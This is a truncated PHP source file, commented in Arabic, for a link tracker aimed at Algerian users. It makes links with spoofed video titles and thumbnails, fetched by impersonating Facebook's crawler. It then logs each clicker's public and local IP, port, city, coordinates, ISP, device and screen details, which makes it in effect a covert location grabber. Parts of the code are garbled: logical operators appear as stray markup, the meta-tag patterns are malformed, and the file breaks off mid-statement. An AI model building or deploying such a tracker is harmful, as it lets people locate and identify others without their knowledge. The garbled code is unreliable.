<?php
// ضبط المنطقة الزمنية للجزائر بدقة
date_default_timezone_set('Africa/Algiers');

// إظهار الأخطاء للتحقق والتأكد من العمل
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

try {
    $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $db->exec("CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT UNIQUE, 
        target_url TEXT, 
        meta_title TEXT,
        meta_image TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    $db->exec("CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT, 
        public_ip TEXT, 
        local_ip TEXT, 
        port TEXT, 
        country TEXT, 
        city TEXT, 
        lat TEXT, 
        lon TEXT, 
        isp TEXT, 
        device_info TEXT, 
        screen_res TEXT, 
        timezone TEXT, 
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
} catch (Exception $e) {
    die("خطأ في قاعدة البيانات: " . htmlspecialchars($e->getMessage()));
}

// دالة سحب غلاف وعنوان الفيديو بدون أي جمل إضافية
function fetch_meta_details($url) {
    $parsed_url = parse_url($url);
    $title =$parsed_url['host'] ?? 'فيديو مشارك';
    $image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";

    if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url,$matches)) {
        $video_id =$matches[1];
        $image = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
    } else {
        $options = [
            'http' => [
                'method' => "GET",
                'header' => "User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)\r\n",
                'timeout' => 2
            ]
        ];
        $context = stream_context_create($options);$html = @file_get_contents($url, false,$context);

        if ($html) {
            if (preg_match('/<property="og:title"\s+content="([^"]+)"/i', $html,$m) || preg_match('/<title>(.*?)<\/title>/i', $html,$m)) {
                $title = html_entity_decode($m[1], ENT_QUOTES, 'UTF-8');
            }
            if (preg_match('/<property="og:image"\s+content="([^"]+)"/i', $html,$m)) {
                $image =$m[1];
            }
        }
    }

    return ['title' => $title, 'image' =>$image];
}

function get_real_ip() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',',$_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function parse_isp($isp_name, $org_name) {$combined = $isp_name . ' ' .$org_name;
    if (stripos($combined, 'Mobilis') !== false \vert{}\vert{} stripos($combined, 'ATM') !== false) return 'موبيليس (Mobilis)';
    if (stripos($combined, 'Djezzy') !== false \vert{}\vert{} stripos($combined, 'Optimum Telecom') !== false) return 'جازي (Djezzy)';
    if (stripos($combined, 'Ooredoo') !== false \vert{}\vert{} stripos($combined, 'Wataniya') !== false) return 'أوريدو (Ooredoo)';
    if (stripos($combined, 'Algérie Télécom') !== false || stripos($combined, 'Algerie Telecom') !== false \vert{}\vert{} stripos($combined, 'AT') !== false) return 'اتصالات الجزائر (Algérie Télécom)';
    return trim($isp_name) ?: 'شبكة غير معروفة';
}

function get_device_type($ua) {$brand = 'جهاز ذكي';
    if (stripos($ua, 'Samsung') !== false)$brand = 'سامسونج (Samsung)';
    elseif (stripos($ua, 'iPhone') !== false)$brand = 'آيفون (iPhone)';
    elseif (stripos($ua, 'Huawei') !== false)$brand = 'هواوي (Huawei)';
    elseif (stripos($ua, 'Xiaomi') !== false \vert{}\vert{} stripos($ua, 'Redmi') !== false || stripos($ua, 'POCO') !== false)$brand = 'شاومي (Xiaomi)';
    elseif (stripos($ua, 'Oppo') !== false)$brand = 'أوبو (Oppo)';
    elseif (stripos($ua,
